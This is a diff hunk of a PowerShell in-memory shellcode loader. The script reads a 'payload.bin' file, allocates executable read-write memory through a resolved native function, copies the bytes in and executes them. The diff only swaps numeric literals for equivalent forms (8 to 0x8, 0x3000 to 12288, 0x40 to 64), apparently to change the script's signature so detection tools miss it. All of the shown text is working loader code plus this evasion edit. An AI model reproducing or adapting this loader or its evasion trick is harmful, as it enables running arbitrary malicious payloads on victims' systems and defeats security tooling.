@@ -20,10 +20,10 @@ function func_get_delegate_type_new_a {
     return $var_builder_new.CreateType()
 }
 
-If ([IntPtr]::size -eq 8) {
+If ([IntPtr]::size -eq 0x8) {
     [Byte[]]$acode = [System.IO.File]::ReadAllBytes('payload.bin')
     $var_va = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address_new_b), (func_get_delegate_type_new_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
-    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
+    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $acode.Length, 12288, 64)
     [Runtime.InteropServices.Marshal]::Copy($acode, 0, $var_buffer, $acode.length)
     $var_runme = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type_new_a @([IntPtr]) ([Void])))
     $var_runme.Invoke([IntPtr]::Zero)
